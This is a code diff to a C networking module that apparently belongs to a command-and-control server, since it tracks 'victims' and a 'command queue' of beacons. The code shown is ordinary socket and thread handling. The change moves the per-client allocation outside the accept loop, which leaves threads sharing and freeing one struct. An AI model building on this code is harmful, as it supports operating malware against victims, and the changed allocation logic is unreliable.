@@ -304,16 +304,13 @@ bool net_server(int port,
     fprintf(stderr, "[x] server port is invalid\n");
     return false;
   }
-
   int server_fd, client_fd;
   struct sockaddr_in server, client;
-
   server_fd = socket(AF_INET, SOCK_STREAM, 0);
   if (server_fd < 0){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
-
   if (setsockopt(server_fd,
                  SOL_SOCKET,
                  SO_REUSEADDR,
@@ -321,7 +318,6 @@ bool net_server(int port,
                  sizeof(int)) < 0){
     fprintf(stderr, "[-] %s\n", strerror(errno));
   }
-
   memset(&server, 0, sizeof(server));
   server.sin_family      = AF_INET;
   server.sin_port        = htons(port);
@@ -339,11 +335,11 @@ bool net_server(int port,
   //printf("[+] listening\n");
   while (true){
     socklen_t client_len = sizeof(client);
+    net_t_client_args_t *p_net_t_client_args = malloc(sizeof(net_t_client_args_t));
     while (( client_fd = accept(server_fd,
                                 (struct sockaddr *)&client,
                                 (socklen_t *)&client_len))){
       pthread_t t_client;
-      net_t_client_args_t *p_net_t_client_args = malloc(sizeof(net_t_client_args_t));
       p_net_t_client_args->client_fd = client_fd;
       p_net_t_client_args->p_victims = p_victims;
       p_net_t_client_args->p_commands = p_commands;
@@ -354,6 +350,7 @@ bool net_server(int port,
         fprintf(stderr, "[-] %s\n", strerror(errno));
       }
     }
+    free(p_net_t_client_args);
   }
   close(client_fd);
   return true;
@@ -375,7 +372,16 @@ void *net_pthread_server(void *args){
   pthread_exit(NULL);
 }
 
-net_pthread_server_args_t *net_server_async(int port, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
+net_pthread_server_args_t *net_server_async(int port,
+                                            net_client_beacon_t **p_victims,
+                                            net_server_beacon_t **p_commands){
+  /*
+    :TODO: create async server
+    :port: server port
+    :p_victims: pointer to victims
+    :p_commands: pointer to command queue
+    :returns: (net_pthread_server_args_t *) should free this after use
+  */
   net_pthread_server_args_t *p_net_pthread_server_async_args = malloc(sizeof(net_pthread_server_args_t));
   p_net_pthread_server_async_args->port = port;
   p_net_pthread_server_async_args->p_victims = p_victims;
